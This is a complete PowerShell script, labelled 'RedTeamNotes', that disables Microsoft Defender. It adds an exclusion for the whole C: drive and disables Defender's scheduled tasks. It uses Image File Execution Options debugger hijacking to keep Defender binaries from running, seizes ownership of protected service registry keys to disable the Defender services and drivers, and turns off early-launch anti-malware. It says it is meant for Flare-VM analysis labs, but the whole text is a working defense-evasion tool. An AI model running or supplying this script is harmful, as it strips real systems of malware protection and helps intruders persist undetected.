<#
.SYNOPSIS
    RedTeamNotes: Native-Only Defender Removal with Ownership Hijacking.
.DESCRIPTION
    Forces ownership of protected registry keys to Administrators before 
    disabling services. Designed for Flare-VM environments.
#>

[CmdletBinding()]
param ([Switch]$PurgeFiles)

Write-Host "[*] RedTeamNotes Native Neutralization initialized." -ForegroundColor Cyan

# --- Helper Function: Take Ownership and Grant Access ---
function Take-RegistryOwnership {
    param([string]$Path)
    try {
        # Convert HKLM path to Registry Key object
        $KeyPath = $Path.Replace("HKLM:\", "")
        $RegistryKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($KeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::TakeOwnership)
        
        # 1. Take Ownership (Set to Administrators group)
        $Acl = $RegistryKey.GetAccessControl([System.Security.AccessControl.AccessControlSections]::None)
        $AdminSid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
        $Acl.SetOwner($AdminSid)
        $RegistryKey.SetAccessControl($Acl)

        # 2. Grant Full Control
        $Acl = $RegistryKey.GetAccessControl()
        $AccessRule = New-Object System.Security.AccessControl.RegistryAccessRule("Administrators", "FullControl", "Allow")
        $Acl.SetAccessRule($AccessRule)
        $RegistryKey.SetAccessControl($Acl)
        
        $RegistryKey.Close()
        return $true
    } catch {
        return $false
    }
}

# 1. Pre-flight Check
$TPPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
if ((Get-ItemProperty $TPPath).TamperProtection -ne 4) {
    Write-Warning "[!] Tamper Protection is reported as ON. This script WILL fail core services."
}

# 2. Step 1/5: Exclusions
Write-Host "[Step 1/5] Injecting exclusions..."
Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue

# 3. Step 2/5: Scheduled Tasks
Write-Host "[Step 2/5] Disabling tasks..."
Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\*" | Disable-ScheduledTask -ErrorAction SilentlyContinue

# 4. Step 3/5: IFEO Hijacking
Write-Host "[Step 3/5] Applying IFEO redirection..."
$Binaries = @("MsMpEng.exe", "MpCmdRun.exe", "MpSigStub.exe")
foreach ($Bin in $Binaries) {
    $Key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\${Bin}"
    if (-not (Test-Path $Key)) { 
        # Attempt to create key; if denied, try to take ownership of the parent folder
        New-Item $Key -Force -ErrorAction SilentlyContinue | Out-Null 
    }
    Set-ItemProperty $Key -Name "Debugger" -Value "ntsd.exe -d" -ErrorAction SilentlyContinue
}

# 5. Step 4/5: Service & Driver Neutralization
Write-Host "[Step 4/5] Hijacking Service Control..."
$Services = @("WinDefend", "WdNisSvc", "Sense", "SecurityHealthService", "WdBoot", "WdFilter", "WdNisDrv")

foreach ($Svc in $Services) {
    $RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\${Svc}"
    if (Test-Path $RegPath) {
        if (Take-RegistryOwnership -Path $RegPath) {
            Set-ItemProperty -Path $RegPath -Name "Start" -Value 4 -ErrorAction SilentlyContinue
            Write-Host "    [-] ${Svc}: Disabled" -ForegroundColor Gray
        } else {
            Write-Host "    [X] ${Svc}: Access Denied (Ownership hijacking failed)" -ForegroundColor Red
        }
    }
}

# 6. Step 5/5: ELAM
Write-Host "[Step 5/5] Finalizing..."
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DisableAntiMalware" -Value 1 -ErrorAction SilentlyContinue

Write-Host "[#] RedTeamNotes: Complete. REBOOT TO UNLOAD DRIVERS." -ForegroundColor Green
